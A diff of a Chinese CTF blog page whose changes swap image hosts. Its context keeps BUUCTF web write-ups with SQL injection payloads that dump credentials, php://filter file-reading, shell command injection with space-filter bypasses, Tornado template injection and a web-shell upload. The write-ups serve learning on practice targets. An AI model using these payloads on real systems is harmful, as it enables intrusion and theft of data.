@@ -291,7 +291,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/southerose/PictureBed/raw/master/img/20211116173634.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://github.com/southerose/PictureBed/raw/master/img/20211116173634.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -412,12 +412,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/wp/">
-                                <span class="chip bg-color">wp</span>
-                            </a>
-                        
                             <a href="/tags/buuctf/">
                                 <span class="chip bg-color">buuctf</span>
+                            </a>
+                        
+                            <a href="/tags/wp/">
+                                <span class="chip bg-color">wp</span>
                             </a>
                         
                             <a href="/tags/web/">
@@ -452,7 +452,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-16
+                    2022-05-28
                 </div>
                 
 
@@ -493,9 +493,9 @@
 <li>文件包含类题目</li>
 <li>首先要去想，如何才能执行下面的include语句，要满足if语句中的3个条件，第三个条件主要就是分析出<code>mb_substr</code>函数截取之后</li>
 </ul>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620154402.png"></p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620154402.png"></p>
 <p>滑稽~，直接查看源代码</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620154427.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620154427.png"></p>
 <p>提示source.php</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
     highlight_file(__FILE__);
@@ -548,7 +548,7 @@
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>根据code找到页面中有个hint.php</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620154647.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620154647.png"></p>
 <p>首先，我们传入一个get型的参数file，在if语句中判断并满足三个条件都为<code>True</code>时，然后才会去<code>包含</code>传入的参数</p>
 <ul>
 <li>传参不为空</li>
@@ -582,14 +582,14 @@
 <h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>PHP万能密码登陆</li>
 </ul>
-<h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620203052.png"></p>
+<h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620203052.png"></p>
 <p>打开时一个登录框，直接上万能密码</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620203416.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620203547.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620203416.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620203547.png"></p>
 <h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>get型传参</li>
 </ul>
-<h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620204027.png"></p>
+<h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620204027.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">$cat=$_GET['cat'];
 echo $cat;
 if($cat=='dog'){
@@ -599,7 +599,7 @@ if($cat=='dog'){
 <p>直接传入一个参数<code>cat</code></p>
 <pre class="line-numbers language-none"><code class="language-none">?cat=dog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620204201.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620204201.png"></p>
 <h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>（这题本身没有源码，源码是我从网上下载的便于学习）</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
 
@@ -671,8 +671,8 @@ if(isset($_GET['inject'])) {
 <pre class="line-numbers language-none"><code class="language-none">1' or 1=2#
 1' or 1=1#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210621164415.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210621164444.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210621164415.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210621164444.png"></p>
 <p>到这里发现存在注入，首先尝试<code>union select</code>联合查询注入</p>
 <blockquote>
 <p>联合查询注入（无法利用）</p>
@@ -680,8 +680,8 @@ if(isset($_GET['inject'])) {
 <p>查询列数</p>
 <pre class="line-numbers language-none"><code class="language-none">1' order by 2#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210621164648.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210621164735.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210621164648.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210621164735.png"></p>
 <p>这里过滤了很多字符，<code>select update delete drop insert where ./</code>，双写和大小写<code>select</code>无法绕过，这里我们经过一番探索，发现堆叠注入</p>
 <blockquote>
 <p>堆叠注入</p>
@@ -689,22 +689,22 @@ if(isset($_GET['inject'])) {
 <p>查库</p>
 <pre class="line-numbers language-none"><code class="language-none">1';show database;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620211947.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620211947.png"></p>
 <p>查表</p>
 <pre class="line-numbers language-none"><code class="language-none">1';show tables;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620210241.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620210241.png"></p>
 <p>查询到当前存在一张名为<code>1919810931114514</code>，很特异，所以猜测flag存在在该表中</p>
 <blockquote>
 <p>查列</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">1';show columns from `1919810931114514`;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210621165416.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210621165416.png"></p>
 <p>这里还可使用<code>desc</code>，查看到列名</p>
 <pre class="line-numbers language-none"><code class="language-none">1';desc `1919810931114514`;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620212200.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620212200.png"></p>
 <p><strong>要绕过<code>select</code>查询flag，有以下几种方式：</strong></p>
 <h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><blockquote>
 <p>handler代替select</p>
@@ -854,13 +854,13 @@ alter table words change flag id varchar(50);
 <li><code>操作符重置法</code></li>
 </ul>
 <h2 id="过程-4"><a href="#过程-4" class="headerlink" title="过程"></a>过程</h2><p>主页：</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210622204025.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210622204025.png"></p>
 <p>输入参数1</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210622204059.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210622204059.png"></p>
 <blockquote>
 <p>order by查询字段</p>
 </blockquote>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210622204228.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210622204228.png"></p>
 <p>经过一番测试，发现过滤了<code>order by、select</code>等，双写，大小写也无法绕过</p>
 <blockquote>
 <p>堆叠查询</p>
@@ -916,7 +916,7 @@ Array
 <pre class="line-numbers language-none"><code class="language-none">select *,1||flag from Flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>在本地测试一番：</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210622210321.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210622210321.png"></p>
 <p>payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">*,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -934,23 +934,23 @@ Array
 <li>php://filter 伪协议文件包含读取源代码，加上read=convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</li>
 </ul>
 <h2 id="过程-5"><a href="#过程-5" class="headerlink" title="过程"></a>过程</h2><p>主页：</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210622212914.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210622212914.png"></p>
 <p>有个<code>get</code>型的参数，可以看到传入flag.php，这里是一个文件包含，但是无法查看php脚本的详细内容</p>
 <p>payload</p>
 <pre class="line-numbers language-none"><code class="language-none">?file=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210622213359.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210622213359.png"></p>
 <h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>php://filter 伪协议文件包含读取源代码，加上read=convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</li>
 </ul>
-<h2 id="过程-6"><a href="#过程-6" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625114703.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625115544.png"></p>
+<h2 id="过程-6"><a href="#过程-6" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625114703.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625115544.png"></p>
 <p>源代码出现<code>Archive_room.php</code>，点击跳转到这个页面</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625115623.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625115623.png"></p>
 <p>再点select继续跳转到这个页面，查看源代码没发现什么特别的</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625115649.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625115649.png"></p>
 <p>使用burpsuite抓下包</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625115827.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625115827.png"></p>
 <p>发现<code>secr3t.php</code>，访问得到源码</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;
     &lt;title&gt;secret&lt;/title&gt;
@@ -971,58 +971,58 @@ Array
 <p>可以看到是文件包含，传入一个get型参数<code>file</code>，首先判断if语句中不允许存在<code>../</code>，<code>tp</code>，<code>data</code></p>
 <pre class="line-numbers language-none"><code class="language-none">?file=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625120412.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625120412.png"></p>
 <p>得到加密后内容，解码得到flag</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625120510.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625120510.png"></p>
 <h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>命令执行</li>
 </ul>
 <h2 id="过程-7"><a href="#过程-7" class="headerlink" title="过程"></a>过程</h2><p>主页面：</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625141806.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625141944.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625141806.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625141944.png"></p>
 <p>这里是存在命令<code>执行漏洞</code>的，我们尝试去使用<code>；</code>执行命令</p>
 <pre class="line-numbers language-none"><code class="language-none">127.0.0.1;cat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210625143006.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210625143006.png"></p>
 <h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>常规union select注入</li>
 </ul>
 <h2 id="过程-8"><a href="#过程-8" class="headerlink" title="过程"></a>过程</h2><p>主页：</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627205821.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627205821.png"></p>
 <p>抓包分析下</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627205935.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627205935.png"></p>
 <p>手动测试下注入点</p>
 <blockquote>
 <p>order by查下字段</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">admin' order by 3#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627210356.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627210356.png"></p>
 <blockquote>
 <p>union select寻找显示位</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">-admin' union select 1,2,3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627210541.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627210541.png"></p>
 <blockquote>
 <p>查表</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">-admin' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627210907.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627210907.png"></p>
 <p>发现<code>geekuser</code>,<code>l0ve1ysq1</code>两张表</p>
 <blockquote>
 <p>在l0ve1ysq1中查下字段</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">-admin' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'),3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627211114.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627211114.png"></p>
 <blockquote>
 <p>dump数据</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">-admin' union select 1,(select group_concat(id,username,password) from l0ve1ysq1),3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627211308.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627211308.png"></p>
 <p>得到flag</p>
 <h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><h2 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li><p>变量拼接</p>
@@ -1035,20 +1035,20 @@ Array
 </li>
 </ul>
 <h2 id="过程-9"><a href="#过程-9" class="headerlink" title="过程"></a>过程</h2><p>主页：</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627211908.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627211908.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627211937.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627211937.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627212028.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627212028.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;cat flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627212229.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627212229.png"></p>
 <p>过滤了空格，使用<code>$IFS$1</code>来绕过</p>
 <pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;cat$IFS$1flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627212341.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627212341.png"></p>
 <p>过滤了<code>flag</code>，但是可以查看下index.php</p>
 <pre class="line-numbers language-none"><code class="language-none">?ip=127.0.0.1;cat$IFS$1index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -1076,7 +1076,7 @@ Array
 
 <p><strong>ps: 参数顺序要注意，adc换位acdflag会被检测出来：）</strong></p>
 <p>过滤了<code>?/\{}()[]*</code> 否则bash语法可以用“？”，正斜杠“/”，数字和字母来执行系统命令。</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210627213653.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210627213653.png"></p>
 <h3 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h3><blockquote>
 <p>sh，bash下编码</p>
 </blockquote>
@@ -1132,10 +1132,10 @@ root@kali:~/# echo '0x63617420612e7478740a'| xxd -r -p Abc<span aria-hidden="tru
 <h2 id="过程-10"><a href="#过程-10" class="headerlink" title="过程"></a>过程</h2><blockquote>
 <p>主页：</p>
 </blockquote>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628212304.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628212304.png"></p>
 <p>直接给出这个主页就是一句话木马</p>
 <p>蚁剑连接，根目录查看到flag</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628212356.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628212356.png"></p>
 <h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><h2 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li><p>X-Forwarded-For</p>
 </li>
@@ -1144,44 +1144,44 @@ root@kali:~/# echo '0x63617420612e7478740a'| xxd -r -p Abc<span aria-hidden="tru
 <li><p>UA的修改</p>
 </li>
 </ul>
-<h2 id="过程-11"><a href="#过程-11" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628212952.png"></p>
+<h2 id="过程-11"><a href="#过程-11" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628212952.png"></p>
 <p>直接发现Secret.php</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628213031.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628213031.png"></p>
 <p>请求头中添加<code>referer</code></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628213136.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628213155.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628213136.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628213155.png"></p>
 <p>修改<code>user-agent</code></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628213230.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628213244.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628213230.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628213244.png"></p>
 <p>添加<code>X-Forwarded-For</code></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210628213346.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210628213346.png"></p>
 <p>得到flag</p>
 <h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><h2 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>scandir</li>
 <li>传入参数名前面添加空格绕过waf</li>
 </ul>
 <h2 id="过程-12"><a href="#过程-12" class="headerlink" title="过程"></a>过程</h2><p>主页：</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210629212925.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210629212925.png"></p>
 <p>随便输入个数字，比如<code>1</code>测试下抓包</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210629213118.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210629213118.png"></p>
 <p>通过查阅大佬的博客，这里可以使用<code>scandir('/')</code>，先扫下目录</p>
 <pre class="line-numbers language-none"><code class="language-none">/calc.php? num=1;var_dump(scandir('/'))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>此条payload中我们在num前面添加一个空格，也就是“ num”,添加空格的目的是假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。（来自大佬的解释），继续测试，发现应该是过滤了 <code>\</code>，chr转换下</p>
 <pre class="line-numbers language-none"><code class="language-none">/calc.php? num=1;var_dump(scandir(chr(47)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210629215725.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210629215725.png"></p>
 <p>发现<code>flagg</code>文件，然后使用<code>file_get_contents</code>读取文件内容，同样采取chr()的方式，然后再拼接起来</p>
 <pre class="line-numbers language-none"><code class="language-none">/calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210629220043.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210629220043.png"></p>
 <h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><h2 id="知识点-13"><a href="#知识点-13" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>Python模板注入（ssti）</li>
 </ul>
 <h2 id="过程-13"><a href="#过程-13" class="headerlink" title="过程"></a>过程</h2><p>根据题目名称tornado，搜索一番，发现tornado是一个Python的模板</p>
 <p>welcome.txt提示render,经过查询render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。</p>
 <p>主页：</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210703163759.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210703163759.png"></p>
 <p>三个文件中分别提示的内容为</p>
 <ul>
 <li>flag in /fllllllllllllag</li>
@@ -1189,15 +1189,15 @@ root@kali:~/# echo '0x63617420612e7478740a'| xxd -r -p Abc<span aria-hidden="tru
 <li>md5(cookie_secret+md5(filename))</li>
 </ul>
 <p>然后抓个包</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210703163938.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210703163938.png"></p>
 <p>不难发现，在file文件下，传入了两个get型的参数，filename和filehash，为了得到flag，filename肯定传入/fllllllllllllag，而filehash需要根据md5(cookie_secret+md5(filename))找出对应的cookie_secret，所以我们重点是放在**找<code>cookie_secret</code>**上</p>
 <p>修改请求行中的filename，发现提示</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712104918.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712104918.png"></p>
 <p>访问提示页面/error?msg=Error</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712105528.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712105528.png"></p>
 <p>存在模板注入，之后进行各种尝试与资料获取发现对于tornado框架存在附属文件handler.settings,于是尝试输入<code>/error?msg={{handler.settings}}</code></p>
 <p>发现 ‘cookie_secret’:</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712105649.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712105649.png"></p>
 <p>计算filehash值</p>
 <pre class="line-numbers language-none"><code class="language-none">import hashlibm
 
@@ -1211,11 +1211,11 @@ hash = hashlib.md5()
 hash.update((cookie_secret+s1).encode('utf-8'))
 print(hash.hexdigest())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712110251.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712110251.png"></p>
 <p>url传入</p>
 <pre class="line-numbers language-none"><code class="language-none">/file?filename=/fllllllllllllag&amp;filehash=7828f14055747177adf201166beddeda<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712110402.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712110402.png"></p>
 <h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><h2 id="知识点-14"><a href="#知识点-14" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>上传phtml文件</li>
 <li>嵌在script标签中的一句话木马</li>
@@ -1223,12 +1223,12 @@ print(hash.hexdigest())<span aria-hidden="true" class="line-numbers-rows"><span>
 <li>请求体中的添加文件头</li>
 </ul>
 <h2 id="过程-14"><a href="#过程-14" class="headerlink" title="过程"></a>过程</h2><p>主页就是上传点，先上传一个正常的shell.php文件</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712150743.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712150731.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712150829.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712150743.png"></p>
